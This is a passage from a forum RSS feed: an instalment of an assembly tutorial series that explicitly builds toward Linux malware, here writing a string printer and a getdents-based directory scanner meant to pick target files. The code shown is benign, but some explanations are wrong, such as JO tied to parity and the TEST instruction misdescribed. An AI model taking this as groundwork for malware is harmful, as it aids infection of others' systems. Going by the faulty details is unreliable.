 6bd:   bf 01 00 00 00          mov    edi,0x1
 6c2:   e8 e2 01 00 00          call   mfw_write
 6c7:   80 3b 00                cmp    BYTE PTR [rbx],0x0      ;; Check if next character is 0
 6ca:   48 89 de                mov    rsi,rbx                 ;; Update pointer
 6cd:   75 e5                   jne    l0                      ;; If not cero, repeat
 6cf:   5b                      pop    rbx
 6d0:   c3                      ret

</code></pre>
<p>This code is 39 bytes long, so, yes it has been a good size reduction</p>
<p>And this is what we get when compiling with max optimisation (<code>-O7</code>):</p>
<pre><code class="lang-auto">     750:       80 3f 00                cmp    BYTE PTR [rdi],0x0  ;; Check current char is 0
     753:       74 2b                   je     780 &lt;exit&gt;
     755:       53                      push   rbx
     756:       48 89 fe                mov    rsi,rdi       ;; Copy String in `RSI`
     759:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]  ;; NOP... Alignment?
l0:	 
     760:       48 8d 5e 01             lea    rbx,[rsi+0x1] ;; Inc String
     764:       ba 01 00 00 00          mov    edx,0x1       ;; Set parameters
     769:       bf 01 00 00 00          mov    edi,0x1
     76e:       e8 24 14 00 00          call   mfw_write
     773:       80 3b 00                cmp    BYTE PTR [rbx],0x0 ;; Is 0?
     776:       48 89 de                mov    rsi,rbx        ;; Update pointer
     779:       75 e5                   jne    760 &lt;l0&gt;       ;; Jump if not 0
     77b:       5b                      pop    rbx
     77c:       c3                      ret
     77d:       0f 1f 00                nop    DWORD PTR [rax]
exit:	 
     780:       f3 c3                   repz ret

</code></pre>
<p>This code is a bit closer to our original one. It is 50 bytes long, something in between the vanilla code and the size optimised one.</p>
<p>Just for comparison purposes, let’s show the opcodes of our <code>mfw_puts</code> version, to get an idea of the size:</p>
<pre><code class="lang-auto">0000000000400113 &lt;mfw_puts&gt;:
  400113:       48 89 fe                mov    rsi,rdi
  400116:       bf 01 00 00 00          mov    edi,0x1
  40011b:       48 89 fa                mov    rdx,rdi

000000000040011e &lt;mfw_puts_l0&gt;:
  40011e:       80 3e 00                cmp    BYTE PTR [rsi],0x0
  400121:       74 0a                   je     40012d &lt;mfw_puts_exit&gt;
  400123:       e8 a8 ff ff ff          call   4000d0 &lt;mfw_write&gt;
  400128:       48 ff c6                inc    rsi
  40012b:       eb f1                   jmp    40011e &lt;mfw_puts_l0&gt;

000000000040012d &lt;mfw_puts_exit&gt;:
  40012d:       c3                      ret
</code></pre>
<p>Ours is just 27 bytes :)… That’s pretty cool… We could also write the function like this:</p>
<pre><code class="lang-auto">000000000040012e &lt;mfw_puts2&gt;:
  40012e:       48 89 fe                mov    rsi,rdi
  400131:       bf 01 00 00 00          mov    edi,0x1
  400136:       48 89 fa                mov    rdx,rdi
  400139:       48 89 f8                mov    rax,rdi

000000000040013c &lt;mfw_puts2_l0&gt;:
  40013c:       80 3e 00                cmp    BYTE PTR [rsi],0x0
  40013f:       74 07                   je     400148 &lt;mfw_puts2_exit&gt;
  400141:       0f 05                   syscall
  400143:       48 ff c6                inc    rsi
  400146:       eb f4                   jmp    40013c &lt;mfw_puts2_l0&gt;

0000000000400148 &lt;mfw_puts2_exit&gt;:
  400148:       c3                      ret

</code></pre>
<p>This version is the same size, but it is way more efficient, as we have removed the <code>call</code> instruction that, as you already know, pushes <code>RIP</code> in the stack, branches, do a register assignment, and then pops <code>RIP</code> from the stack to continue. Now, we just call <code>syscall</code>, so we are saving quite a few instructions for each string character.</p>
<h1>
<a name="flags-4" class="anchor" href="https://0x00sec.org#flags-4"></a>Flags</h1>
<p>The so-called processor flags are stored usually in a special register. The flags are just special conditions raised by the operations performed in the ALU (Arithmethic Logic Unit) and other processor status. You usually do not use the flags directly (they are just bits in a special register as I said), most of them are used by jump instructions to allow us to change the program flow based on the value of the flags. Other flag are special and are changed using processor instructions</p>
<p>This sounds very abstract so we better describe then right away:</p>
<ul>
<li>
<strong>CF 	Carry flag</strong>. Used to indicate when an arithmetic carry or borrow has been generated out of the most significant arithmetic logic unit (ALU) bit position. This is very relevant when implementing mathematical operations.</li>
<li>
<strong>PF 	Parity flag</strong>. Parity flag changes according to the number of 1s in a given ALU result. If the number of 1s is even and 0 if it is odd. The <code>JO</code> will jump when parity is odd and <code>JNO</code> if not.</li>
<li>
<strong>AF 	Adjust flag</strong>. This flag is the same than the carry flag but only for the last nibble (last 4 bits of the number). It is relevant when working with BCD (Binary Coded Decimal) numbers, but that is really old stuff. We won’t use this</li>
<li>
<strong>ZF 	Zero flag</strong>. This flag get activated whenever the result of the last operation is zero.</li>
<li>
<strong>SF 	Sign flag</strong>. This flag indicates the sign of the last operation. When set to 1 the value is negative, otherwise is positive.</li>
<li>
<strong>OF 	Overflow flag</strong>. This flag gets activated whenever the last operation performed produced and overflow. That is, the result is bigger than the size of the register that has to store that result.</li>
</ul>
<p>There are a few more flags but they are not related to the ALU and introducing them right now will not help us at all. They will get in later when needed.</p>
<p>The jump instructions <code>JXX</code> are composed adding two characters (that <code>XX</code>) that defines the flags that will be checked to jump or not. This is a table of all possibilities, you will see than some combination of letters are redundant:</p>
<pre><code>JXX         Description                          Flag
---         -----------                          ------
E, Z	    Equal, Zero	                         ZF == 1
NE, NZ	    Not Equal, Not Zero	                 ZF == 0
O	        Overflow	                         OF == 1
NO	        No Overflow	                         OF == 0
S	        Signed	                             SF == 1
NS	        Not Signed	                         SF == 0
P	        Parity	                             PF == 1
NP	        No Parity	                         PF == 0
C, B, NAE	Carry, Below, Not Above or Equal     CF == 1
NC, NB, AE	No Carry, Not Below, Above or Equal	 CF == 0
A, NBE	    Above, Not Below or Equal	         CF==0 and ZF==0
NA, BE	    Not Above, Below or Equal	         CF==1 or ZF==1
GE, NL	    Greater or Equal, Not Less	         SF==OF
NGE, L	    Not Greater or Equal, Less	         SF!=OF
G, NLE	    Greater, Not Less or Equal	         ZF==0 and SF==OF
NG, LE	    Not Greater, Less or Equal	         ZF==1 or SF!=OF
</code></pre>
<p>The chose of one or another just depends on what your code has to do… We will be seeing examples in this course, however, some of those, as for instance, the parity flag, are not used very often (maybe on communications software), and the carry is not frequently used either unless you are implementing your own mathematical routines.</p>
<p>Do not worry about all this information. The important thing is that there are multiple jump instructions and that their behaviour depends on the result of the last arithmetic or logical operation performed by the processor.</p>
<h1>
<a name="the-gcc-tricks-5" class="anchor" href="https://0x00sec.org#the-gcc-tricks-5"></a>The gcc tricks</h1>
<p>In the code generated by <code>gcc</code> we have seen a couple of <em>curious</em> ways of doing thing. Let’s quickly comment them.</p>
<p>The first one was the use of the <code>LEA</code> instruction to increase a register:</p>
<pre><code class="lang-auto">lea    rbx,[rsi+0x1] 
</code></pre>
<p>The <code>LEA</code> instruction takes it name from the acronym <em>Load Effective Address</em>. It basically loads in the first operand, the address indicated in the second. When compared with <code>MOV</code>, <code>LEA</code> loads the address and <code>MOV</code> loads the value at that address (note the <code>[]</code> to indicate the indirect addressing mode.</p>
<p>The advantage of using <code>LEA</code> for this is that we can do quite some complex operations on the right side, and those operations are performed by the memory access unit and not by the arithmetic unit, as it happens when using normal <code>add</code>, <code>sub</code>, <code>mul</code>, <code>inc</code>, etc… And the advantage of that is that the memory accessing unit is always involved on the execution of the instruction and therefore, the calculation is done for free… in the sense that it will not add further delays, and also will left the arithmetic unit free for other operations.</p>
<p>We could change our code to use <code>lea rsi,[rsi+1]</code> instead of using <code>inc</code>… That will be a bit faster, but will require 1 extra byte… Depending what you are interested on, chose one or the other.</p>
<p>The other difference with our code is the use of <code>test</code> instead of <code>cmp</code>. The difference between these two is that the first one is an <code>AND</code> operation between the two operators. An <code>AND</code> operation will only be 0 if both values are equal, so it serves our purpose. The <code>cmp</code> instruction is an arithmetic operation, it substracts both operators and actually discards the result. They work the same and for our purpose there is no difference except that  <code>test</code> requires one bit less than <code>cmp</code> (we do not have to provide a value to compare). On the other hand <code>cmp</code> is more explicit and makes the code more readable… Anyhow. that <code>test al,al</code> instruction before a conditional jump, is so common that all of you will know what it means before you finish reading this course.</p>
<p>In general, writing C code, compiling it and look at the generated assembly is a good way to learn. You will see things that you do not known and then you will ask google and get a stackoverflow answer with a lot of useful information that will boost your progress.</p>
<h1>
<a name="adding-a-_start-and-compiling-6" class="anchor" href="https://0x00sec.org#adding-a-_start-and-compiling-6"></a>Adding a <code>_start</code> and compiling</h1>
<p>Well, enough on printing characters, loops and flags. Let’s just write our main program and compile it.</p>
<p>The main program that I have named <code>select_file01.asm</code> will look like this:</p>
<pre><code class="lang-auto">	;; Select file
	
    global    _start
	;; List the functions we will use
	extern    mfw_puts
	extern    mfw_exit
	
    section   .text
_start:
	;; Show welcome message
	mov rdi, wellcome_msg
	call mfw_puts

	;; Call select_target
	
	;; All done. Exiting
	xor rdi, rdi
	call mfw_exit
	
	;; --------------------------
	section .data
wellcome_msg:	db 	"Malware 0.1", 0x0a
</code></pre>
<p>No big surprises here. We just shown a message and then we exit. As you may have noticed already, assembly language is pretty verbose so I will need to split the code in different files to make it manageable. Right now, we just have two files, the main program and the pseudo system library we created, but that is enough to write a simple <code>Makefile</code> to build our program.</p>
<pre><code class="lang-makefile">select_asm01: select_file01.o minilibc.1.o
        ld -o $@ $^

%.o: %.asm
        nasm -f elf64 -o $@ $&lt;

</code></pre>
<p>In case you are not familiar with <code>make</code> here is a quick crash course:</p>
<p>Makefiles are composed of rules. Each rule has one or more lines. The first line indicates what you want to <em>make</em> followed by a colon <code>:</code>. After the colon you add the files that are needed to build that target. Whenever one of those files changes, the rule will get activated.</p>
<p>The second and next lines (if any) are the list of commands to execute in order to use the files on the right of the first line to build the file on the left. In order to make these rules shorter,  <code>make</code> defines several automatic variables… those starting with <code>$</code>. In our case we are using the following:</p>
<pre><code>$@ : Represent the target of the rule. That is, the string at the left of the colon 
$^ : Represent the dependencies of the rule. The string at the right of the colon
$&lt; : Represents just the first dependency.
</code></pre>
<p>Also, we have used a general rule, to compile all <code>.asm</code> files into <code>.o</code> files using <code>nasm</code>. That is the one with <code>%.o:%asm</code>… that basically means, <em>Convert any file with extension .asm into a file with extension .o and the same name</em>.</p>
<p>Then, to build the program we use <code>ld</code> with a specific set of objects.</p>
<p>We will be modifying the <code>Makefile</code> as we go and adding more functionalities. The explanation above is what you will be using most of the time… but there are a few extra things that we will have to learn.</p>
<h1>
<a name="select_target-7" class="anchor" href="https://0x00sec.org#select_target-7"></a><code>select_target</code>
</h1>
<p>Let’s start implementing our <code>select_target</code> function. Let’s write this function in a separated file. Now you should know how to update your Makefile to use the new file you create. If you do not know, ask in the comments.</p>
<p>In our file we will start adding the external references to the functions we want to use and then start coding our function creating a stack frame:</p>
<pre><code class="lang-auto">	global mfw_select_target
	extern mfw_puts
	extern mfw_openat
	extern mfw_getdents
	extern mfw_close

	section .text
mfw_select_target:
	push  rbp
	mov   rbp, rsp
	sub   rsp, 0x10
	
	;; Our code goes here
	
	leave     		; Set RSP=RBP and pops RBP
	ret
</code></pre>
<p>So, let’s go step by step, let’s start declaring 2 longs (16 bytes or 0x10 bytes). We put the general stack frame preamble. Remember our function will have to be recursive so we really need to have a stack frame and keep the relevant information in the stack to pass it from call to call. Then we just call <code>leave</code> at the end. This is equivalent to restore <code>SP</code> and <code>pop rbp</code>… do as you prefer.</p>
<h1>
<a name="adding-local-variables-8" class="anchor" href="https://0x00sec.org#adding-local-variables-8"></a>Adding local variables</h1>
<p>Even when <code>nasm</code> seems to have some macros to help us dealing with the declaration of local variables, let’s try to avoid the use of specific assembler features. Be free to explore yourself the extras provided by your preferred assembler. So, what we are going to do is to use constants to reference the offsets in the stack. This will give us some facility to write the code, at the same time that we keep it simple and clear.</p>
<pre><code class="lang-auto">mfw_select_target:
	FD	    EQU     0x08
	I	    EQU     (FD + 0x08) 
	N	    EQU     (I + 0x08) 
	STE     EQU     N

	push  rbp
	mov   rbp, rsp
	sub   rsp, STE
	(...)
</code></pre>
<p>So, we have a long at <code>0x08</code> that we will use to store or file descriptor (<code>FD</code>) and another long at <code>0x10</code> (‘I’) that we will use as a general counter to navigate the directory entries and finally another long at <code>0x18</code> to read the number of bytes read from <code>getdent</code>. We still have to declare a buffer and a structure, but as I said, let’s go step by step.</p>
<p><em>Note: At the end you will see that we do not need the <code>I</code> and <code>N</code> variable, but I just keep then to have a more relevant example</em></p>
<p>With this definitions, we can access the local variables like this:</p>
<pre><code class="lang-auto">   mov rax, [rbp - FD]   ;; rax = FD
   mov [rbp - FD], rax   ;; FD = rax
</code></pre>
<p>Now, we can add the code to open and close the directory:</p>
<h1>
<a name="openclose-directory-9" class="anchor" href="https://0x00sec.org#openclose-directory-9"></a>Open/Close directory</h1>
<p>This is how it is going to look like:</p>
<pre><code class="lang-auto">mfw_select_target:
  ;; Constants and stack frame code. See above
  ;; At function entry, the registers are as follow:
  ;;    RDI  -&gt; file descriptor (0 from main)
  ;;    RSI  -&gt; current folder name
  mov   rdx, 0q200000     ;; Set 3rd parameter to O_RDONLY | O_DIRECTORY
  call  mfw_openat
  mov   [rbp-FD], rax
  
  ;; Iterate directory... TO be writen


  mov   rdi, [rbp-FD]
  call  mfw_close
</code></pre>
<p>So far so good. We already have <code>rdi</code> and <code>rsi</code> set from the function call. We have conveniently selected the order of the parameters to match <code>openat</code> so we do not have to do anything with them. The 3rd parameter is the flags that should be set to <code>O_RDONLY | O_DIRECTORY</code>. You can find the values of this constants in <code>/usr/include/bits/fcntl-linux.h</code>… Check previous instalments to figure out how to get to that file:</p>
<pre><code>$ egrep 'O_RDO|O_DIR'  /usr/include/bits/fcntl-linux.h
#define O_RDONLY             00
#ifndef __O_DIRECTORY
# define __O_DIRECTORY  0200000
#ifndef __O_DIRECT
# define __O_DIRECT      040000
# define __O_TMPFILE   (020000000 | __O_DIRECTORY)
# define O_DIRECTORY    __O_DIRECTORY   /* Must be a directory.  */
# define O_DIRECT       __O_DIRECT      /* Direct disk access.  */
</code></pre>
<p><code>O_RDONLY</code> is just 0 so we can ignore it. and <code>O_DIRECTORY</code> is <code>0200000</code>… and octal number. <code>nasm</code> uses the format <code>0qNUM</code> or <code>NUMo</code> to represent octal values… that is why we use <code>0q200000</code> as a flag.</p>
<p>Then we just call <code>mfw_openat</code> and we store the return value (that we get on register <code>rax</code>) into our local variable… Easy isn’t it?</p>
<p>At this point we can start doing things with our directory… We will come to this in a sec.</p>
<p>We finish the function closing the file. We just get file descriptor from the local variable and we put it in <code>RDI</code> to pass it as first parameter to <code>mfw_close</code>.</p>
<h1>
<a name="testing-the-code-10" class="anchor" href="https://0x00sec.org#testing-the-code-10"></a>Testing the code</h1>
<p>The code above, just works because I tested myself. So, I will tell you how you can debug your code. The first thing you have to do is to compile your program with debug information. For that we need to make a small change in our Makefile:</p>
<pre><code class="lang-makefile">all: select_asm01 select_asm02

DEBUG=-F dwarf -g

select_asm01: select_file01.o minilibc.1.o
        ld -o $@ $^

select_asm02: select_file02.o select_target.o minilibc.1.o
        ld -o $@ $^

%.o: %.asm
        nasm -f elf64 ${DEBUG} -o $@ $&lt;


</code></pre>
<p>I have created a second binary for this new update. You do not have to, for me, as I write this, is good to have all versions available at all times for checking/testing things. For compiling a second <code>select_asm02</code>, I just added the general rule, including the new <code>select_target.o</code>, and then I used the general rule <code>all:</code> as the first rule, to get it fired when invoking <code>make</code>. In order to complete the rule <code>all</code>, the two binaries are required… and that will fire all the required rules to get them compiled.</p>
<p>I have also declared a variable named <code>DEBUG</code>, containing the <code>nams</code> flags to add debug information to the object files, so we can use <code>gdb</code> (or other debugger) to debug our program. The good thing about using a variable, is that we can remove the debug information just removing the variable and recompiling… Also we will have to write less if we want to change the flags (for instance to use a different debug format).</p>
<p>Now, you can load the program with <code>gdb</code> and check that everything is working fine:</p>
<pre><code>$ gdb -q ./select_asm02
Reading symbols from ./select_asm02...done.
(gdb) b select_target.asm:21
Breakpoint 1 at 0x4000ed: file select_target.asm, line 21.
(gdb) r
Starting program: /mnt/mia/work/projects/security/p4w_malware/07/09/select_asm02
Malware 0.1
/tmp/
Breakpoint 1, mfw_select_target () at select_target.asm:21
21              call mfw_openat
(gdb) n
22              mov  QWORD [rbp-FD], rax                ;Store fd in local var
(gdb) p $rax
$1 = 5
(gdb) n
23              mov   rdi, [rbp-FD]
(gdb) x/d $rbp - 8
0x7fffffffe278: 5
</code></pre>
<p>In case something goes wrong, you will get a negative value on <code>rax</code>. That is actually <code>-errno</code>. Then you can just check the error codes using the command:</p>
<pre><code>$ errno -l
</code></pre>
<h1>
<a name="reading-the-directory-11" class="anchor" href="https://0x00sec.org#reading-the-directory-11"></a>Reading the directory</h1>
<p>Now, it is time to start reading the directory, using our old friend <code>getdents</code>. If you remember the C code, we will have to run a loop and navigate multiple records in the buffer returned by the syscall. I will keep trying to make the code small. This roughly means that I will keep using registers while they are available, instead of local variables. This may change later, but for now we are still OK.</p>
<p>Still, we need some changes in the constants we defined before. Now, we need a buffer and some offsets to access the struct returned by <code>getdents</code>. These is how the constants have changed</p>
<pre><code class="lang-auto">mfw_select_target:
	BUF_SIZE EQU    0x400           ; 1024 bytes buffer for getdents (see C version)
	FD	     EQU     0x08           ; Directory File Descriptor (stack index for local var)
	BUF      EQU     (FD + BUF_SIZE); The buffer is also in the stack as a local variable
	STE      EQU     BUF            ; Mark of end of local variables
	D_NAME   EQU     0x12           ; Offset to field d_name in struct dirent
	D_RECLEN EQU     0x10           ; Offset to field d_reclen in struct dirent
</code></pre>
<p>The opening and closing of the folder is exactly the same. But now we will have to do two loops. The first loop will call <code>getdents</code> until it returns 0 (i.e. the directory have been completely read), and then another loop to process all the entries returned for each call to <code>getdents</code>. Let’s start with the first loop. This goes just after opening the directory:</p>
<pre><code class="lang-auto">loop0:
	mov  rdi, QWORD [rbp-FD]
	lea  rsi, [rbp-BUF]
	mov  rdx, BUF_SIZE
	call mfw_getdents
	
	test ax,ax
	jz   done
	js  loop0
	mov  r9, rax
    ;; 
    ;; Second loop goes here
	;; (...)
done:	
	;; Close directory
</code></pre>
<p>This loop is pretty straightforward. We start calling <code>mfw_getdents</code>. First parameter is the file descriptor that we have stored in a local variable, second parameter is the address of the buffer (we use <code>lea</code> to load the address and not the value), and the third parameter is the size of the buffer that is just a constant.</p>
<p><code>mfw_getdents</code> returns the number of bytes read in <code>rax</code>. We store that value in register <code>r9</code>, this is going to be our counter for the second loop. After that we check for zero (<code>jz</code> <em>Jump if Zero</em>)) and negative number (<code>js</code> <em>Jump if Sign</em>). When we get zero we are done and we proceed to close the folder, and in case the value is negative (that’s an error), we keep reading… but we should likely just stop the program. I leave up to you to check the possible errors returned by <code>getdents</code> to decide if it makes sense to keep trying or we should just abort.</p>
<p>I believe this is pretty clear, but just in case you are having a hard time following this, let’s recall for a second the original C code:</p>
<pre><code class="lang-auto"> while (1) {
    n = mfw_getdents (fd, buf, BUF_SIZE);
    if (n &lt; 0) continue; // Silently ignore errors
    if (n == 0) break;
    (...)
    }
</code></pre>
<p>Now, let’s change the variables by the registers and local variables of our asm</p>
<pre><code class="lang-auto"> while (1) {
 loop0:
    RAX = mfw_getdents ([RBP-FD], [RBP-BUF], BUF_SIZE);
    if (RAX == 0) goto done;
    if (RAX &lt; 0) goto loop0; // Silently ignore errors

    (...)
    }
</code></pre>
<p>Hope it is clear now.</p>
<h1>
<a name="printing-the-directory-12" class="anchor" href="https://0x00sec.org#printing-the-directory-12"></a>Printing the directory</h1>
<p>Now we can write the second loop. As mentioned, this loop will iterate through the buffer returned by <code>mfw_getdents</code> printing the different folder entries (check the <a href="https://0x00sec.org/t/programming-for-wanabes-vii-finding-files-i/25662">Part VII</a> for details). Let’s see the code and then we can comment it.</p>
<pre><code class="lang-auto">	lea r8, [rbp-BUF] 	    ; Points to struct linux_dirent record

loop1:	
	lea rdi, [r8 + D_NAME]	; d_name in rdi
	call mfw_putln

	mov dx, WORD [r8 + D_RECLEN] ; Get Record len
	sub  r9, rdx
	jz loop0                ; If it is zero, get more data
	
	;; Otherwise Update pointers
	add r8, rdx
	jmp loop1
</code></pre>
<p>In this piece of code we are going to use <code>r8</code> as our pointer to go through the different entries (<code>struct dirent</code>) in the buffer, so we initialise it to point to the first one, which is at the very beginning of the buffer. Then our loop starts.</p>
<p>First we print the current record. The <code>d_name</code> field is at offset <code>0x12</code> (that is the <code>D_NAME</code> constant we defined before), so we load that address on <code>rdi</code> in order to printy the name.</p>
<p>Then we recover the size of the record. Remember the records have variable length, because of the different sizes of the file names in the folder. The size of the record is at offset <code>0x10</code> (the <code>D_RECLEN</code> constant). We read that value in register <code>dx</code>. In this case we are using the 16 bits version of the register because that is the size of the value we are reading. Remember: <code>RDX</code> 64bits, <code>EDX</code>, 32bits, <code>DX</code> 16 bits.</p>
<p>Now that we now the size of this record, we can update our counter, which, if you remember is <code>r9</code>. Once we have updated the counter we have to check if we are done, that is, the counter is zero, so we just <code>JZ</code> after the substraction.</p>
<p>In case there is still data to be processed we need to update or <code>struct dirent</code> pointer that we keep in <code>r8</code>. So we add the size of the current register and <code>r8</code> points now to the next register. You can refer to <a href="https://0x00sec.org/t/programming-for-wanabes-vii-finding-files-i/25662">this previous instalment</a> for some diagrams of the memory layout o this structure.</p>
<p>Again, let’s recall the original C code:</p>
<pre><code class="lang-auto">   for (i = 0; i &lt; n;) {
      de = (struct linux_dirent *)(buf + i);
	  puts (de-&gt;d_name);
      i += de-&gt;d_reclen;
</code></pre>
<p>In this case we have wrote the code a little bit different. So, let’s rework a bit this C code before introducing the registers and local variables of the asm</p>
<pre><code class="lang-auto">  // n containts the return from `getdents`
  register int len; // Auxiliar variable in an unused register
  de = (struct linux_dirent *) buf;
  while (1) {
     puts (de-&gt;d_name);
	 len = de-&gt;d_reclen;
	 n-=len;
	 if (!n) goto loop1; // more getdents
	 de = (struct linux_dirent*)((char *)de + len);
  }
</code></pre>
<p>And this is what we got:</p>
<pre><code class="lang-auto">  r9 = n; // Return from `getdents`
  r8 = (struct linux_dirent*) buf

   while (1) {
     mfw_putln ((r8+D_NAME))
	 dx = *(r8+D_RECLEN)
	 r9 -= dx;
	 if (!r9) goto loop0;
	 r8 += dx
   }
</code></pre>
<p>Note that in C, due to the pointer arithmethic we need to first cast <code>de</code> to a char pointer so when we add <code>len</code> we add <code>len</code> bytes and not <code>len</code> <code>struct linux_dirent</code> elements. In assembler there is no pointer arithmetic so we just add the value. Now you can see why the original C code was more convenient.</p>
<h1>
<a name="what-did-gcc-did-13" class="anchor" href="https://0x00sec.org#what-did-gcc-did-13"></a>What did gcc did?</h1>
<p>Just out of curiosity, let’s see the code generated by gcc using the following flags:</p>
<pre><code>-fomit-frame-pointer -fno-stack-protector -Os
</code></pre>
<pre><code class="lang-auto">0000000000000792 &lt;select_target&gt;:
 792:   41 56                   push   r14
 794:   41 55                   push   r13
 796:   48 89 f7                mov    rdi,rsi
 799:   41 54                   push   r12
 79b:   55                      push   rbp
 79c:   be 00 00 01 00          mov    esi,0x10000
 7a1:   53                      push   rbx
 7a2:   48 81 ec 00 04 00 00    sub    rsp,0x400
 7a9:   e8 11 ff ff ff          call   6bf &lt;mfw_open&gt;
 7ae:   49 89 e5                mov    r13,rsp        ;; r13 buffer
 7b1:   41 89 c4                mov    r12d,eax       ;; r12d FD
loop0:
 7b4:   ba 00 04 00 00          mov    edx,0x400
 7b9:   4c 89 ee                mov    rsi,r13
 7bc:   44 89 e7                mov    edi,r12d
 7bf:   e8 b6 fe ff ff          call   67a &lt;mfw_getdents&gt;
 7c4:   85 c0                   test   eax,eax
 7c6:   41 89 c6                mov    r14d,eax      ;; r14d bytes read
 7c9:   78 e9                   js     7b4 &lt;loop0&gt;
 7cb:   74 1e                   je     7eb &lt;done&gt;
 7cd:   31 db                   xor    ebx,ebx       ;; ebx counter
loop1: 
 7cf:   48 63 eb                movsxd rbp,ebx
 7d2:   4c 01 ed                add    rbp,r13       ;; buffer + i
 7d5:   48 8d 7d 12             lea    rdi,[rbp+0x12];; d_name offset
 7d9:   e8 20 ff ff ff          call   6fe &lt;mfw_puts&gt;
 7de:   0f b7 45 10             movzx  eax,WORD PTR [rbp+0x10] ;; eax = d_reclen
 7e2:   01 c3                   add    ebx,eax        ;; i += reclen
 7e4:   41 39 de                cmp    r14d,ebx       ;; i &gt; n?
 7e7:   7f e6                   jg     7cf &lt;select_target+0x3d&gt;
 7e9:   eb c9                   jmp    7b4 &lt;loop0&gt;
done:
 7eb:   44 89 e7                mov    edi,r12d
 7ee:   e8 e3 fe ff ff          call   6d6 &lt;mfw_close&gt;
 7f3:   48 81 c4 00 04 00 00    add    rsp,0x400
 7fa:   31 c0                   xor    eax,eax
 7fc:   5b                      pop    rbx
 7fd:   5d                      pop    rbp
 7fe:   41 5c                   pop    r12
 800:   41 5d                   pop    r13
 802:   41 5e                   pop    r14
 804:   c3                      ret


</code></pre>
<p>Those are 114 bytes, against the 96 bytes of our version. No big difference. The code is pretty similar, actually, it is better to count up as in the original C code so we save an operation. This is a good exercise for you, to sharpen your just learnt assembly skills.</p>
<p>To conclude with this instalment, I will just add here the whole source code just in case you got lost at some point during the explanation:</p>
<pre><code class="lang-auto">	global mfw_select_target
	extern mfw_puts
	extern mfw_putln
	extern mfw_openat
	extern mfw_getdents
	extern mfw_close

	section .text
	
mfw_select_target:
	BUF_SIZE EQU    0x400
	FD	 EQU     0x08
	BUF      EQU     (FD + BUF_SIZE)
	STE      EQU     BUF
	D_NAME   EQU     0x12
	D_RECLEN EQU     0x10

	push  rbp
	mov   rbp, rsp
	sub   rsp, STE
	;; Open Directory
	;; RDI and RSI should be all set
	mov rdx, 0q200000 	;O_RDONLY | O_DIRECTORY
	call mfw_openat
	mov  QWORD [rbp-FD], rax		;Store fd in local var

loop0:
	mov  rdi, QWORD [rbp-FD]
	lea  rsi, [rbp-BUF]
	mov  rdx, BUF_SIZE
	call mfw_getdents
	

	test ax,ax
	jz   done
	js  loop0
	mov  r9, rax
	lea r8, [rbp-BUF] 	; Points to struct linux_dirent record

loop1:	
	lea rdi, [r8 + D_NAME]	; d_name in rdi
	call mfw_putln

	mov dx, WORD [r8 + D_RECLEN] ; Get Record len
	sub  r9, rdx
	jz loop0                ; If it is zero, get more data
	
	;; Otherwise Update pointers
	add r8, rdx

	jmp loop1
done:	
	;; Close directory
	mov rdi, QWORD [rbp-FD]
	call mfw_close
	leave     		; Set RSP=RBP and pops RBP
	ret
</code></pre>
<p><em>Note: Our asm version, once stripped is just 816 bytes static binary.</em></p>
<h1>
<a name="conclusion-14" class="anchor" href="https://0x00sec.org#conclusion-14"></a>Conclusion</h1>
<p>In this instalment we have learn how to write loops in assembly and also learned a few tricks from <code>gcc</code> just looking to the code it generates. We have learn how to deal with local variables and use structs in assembler and also how to create Makefiles and compile our assembly with debug information so we can find errors during the development.</p>
<p>Then we have just completed the first part of the <code>select_target</code> function that allows us to access all the files in a given directory. In the next instalment we will add the <code>stat</code> syscall so we can select the appropriated files for our malware.</p>
<h2>
<a name="read-the-whole-series-here-15" class="anchor" href="https://0x00sec.org#read-the-whole-series-here-15"></a>Read the whole series here</h2>
<p><a href="https://0x00sec.org/t/programming-for-wanabes-viii-file-details/25738">Part VIII, File Details</a><br>
<a href="https://0x00sec.org/t/programming-for-wanabes-vii-finding-files-i/25662">Part VII. Finding files</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-vi-malware-introduction/25595">Part VI. Malware Introduction</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-v-a-dropper/23090">Part V. A dropper</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-iv/22421">Part IV. The stack</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabees-part-iii-your-first-shell-code/1279">Part III. Your first Shell Code</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-ii-and-a-half/1196">Part II and a Half. Part II for ARM and MIPS</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-ii/1164">Part II. Shrinking your program</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-i/1143">Part I. Getting Started</a></p>
            <p><small>8 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/programming-for-wanabes-ix-finding-files-in-asm/25794">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/programming-for-wanabes-ix-finding-files-in-asm/25794</link>
          <pubDate>Mon, 26 Apr 2021 22:26:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25794</guid>
          <source url="https://0x00sec.org/t/programming-for-wanabes-ix-finding-files-in-asm/25794.rss">Programming for Wanabes IX. Finding Files in asm</source>
        </item>
        <item>
          <title>Programming for Wanabes VIII. File Details</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>We have learnt how to scan directories and list their content, now we need to figure out how to get the details of the directory contents so we can chose the files we are interested on. This is actually very simple and requires one single system call.</p>
<h1>The <code>stat</code> system call</h1>
<p>The <code>stat</code> system call, allow us to get all the details of a specific fie. The prototype of this syscall is :</p>
<pre><code class="lang-auto">int stat(const char *pathname, struct stat *statbuf);
</code></pre>
<p>And the <code>struct stat</code> (now we know what a struct is don’t we?), contains the following information:</p>
<pre><code class="lang-auto">struct stat {
       dev_t     st_dev;         /* ID of device containing file */
       ino_t     st_ino;         /* Inode number */
       mode_t    st_mode;        /* File type and mode */
       nlink_t   st_nlink;       /* Number of hard links */
       uid_t     st_uid;         /* User ID of owner */
       gid_t     st_gid;         /* Group ID of owner */
       dev_t     st_rdev;        /* Device ID (if special file) */
       off_t     st_size;        /* Total size, in bytes */
       blksize_t st_blksize;     /* Block size for filesystem I/O */
       blkcnt_t  st_blocks;      /* Number of 512B blocks allocated */

       /* Since Linux 2.6, the kernel supports nanosecond
